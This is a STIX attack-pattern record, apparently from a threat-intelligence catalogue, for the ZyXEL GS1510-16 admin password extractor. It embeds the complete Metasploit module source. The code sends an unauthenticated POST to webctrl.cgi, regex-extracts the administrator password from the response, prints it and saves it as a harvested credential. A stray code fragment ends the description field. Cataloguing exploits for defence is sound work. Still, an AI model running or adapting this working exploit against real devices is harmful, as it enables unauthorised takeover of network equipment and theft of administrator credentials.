{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c84078d-fb4b-4696-9ce2-78def071f8c4",
    "created": "2024-08-14T16:23:35.640485Z",
    "modified": "2024-08-14T16:23:35.64049Z",
    "name": "ZyXEL GS1510-16 Password Extractor",
    "description": " This module exploits a vulnerability in ZyXEL GS1510-16 routers to extract the admin password. Due to a lack of authentication on the webctrl.cgi script, unauthenticated attackers can recover the administrator password for these devices. The vulnerable device has reached end of life for support from the manufacturer, so it is unlikely this problem will be addressed.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/zyxel_admin_password_extractor.rb",
            "external_id": "zyxel_admin_password_extractor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name' => 'ZyXEL GS1510-16 Password Extractor',\n      'Description' => %q{\n          This module exploits a vulnerability in ZyXEL GS1510-16 routers\n          to extract the admin password. Due to a lack of authentication on the\n          webctrl.cgi script, unauthenticated attackers can recover the\n          administrator password for these devices. The vulnerable device\n          has reached end of life for support from the manufacturer, so it is\n          unlikely this problem will be addressed.\n      },\n      'References' => [\n        [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/2709' ]\n      ],\n      'Author' => [\n        'Daniel Manser', # @antsygeek\n        'Sven Vetsch' # @disenchant_ch\n      ],\n      'License' => MSF_LICENSE\n    )\n  end\n\n  def run\n    print_status(\"Trying to get 'admin' user password ...\")\n    res = send_request_cgi({\n      'uri' => '/webctrl.cgi',\n      'method' => 'POST',\n      'vars_post' => {\n        'username' => 'admin',\n        'password' => Rex::Text.rand_text_alphanumeric(rand(4..7)).to_s,\n        'action' => 'cgi_login'\n      }\n    }, 10)\n\n    if (res && res.code == 200)\n      print_status('Got response from router.')\n    else\n      print_error('Unexpected HTTP response code.')\n      return\n    end\n\n    admin_password = ''\n    admin_password_matches = res.body.match(/show_user\\(1,\"admin\",\"(.+)\"/)\n\n    if !admin_password_matches\n      print_error('Could not obtain admin password')\n      return\n    else\n      admin_password = admin_password_matches[1]\n      print_good(\"Password for user 'admin' is: #{admin_password}\")\n\n      connection_details = {\n        module_fullname: fullname,\n        username: 'admin',\n        private_data: admin_password,\n        private_type: :password,\n        status: Metasploit::Model::Login::Status::UNTRIED,\n        proof: res.body\n      }.merge(service_details)\n      create_credential_and_login(connection_details) # makes service_name more consistent\n    end\n  rescue ::Rex::ConnectionError\n    print_error(\"#{rhost}:#{rport} - Failed to connect\")\n    return\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}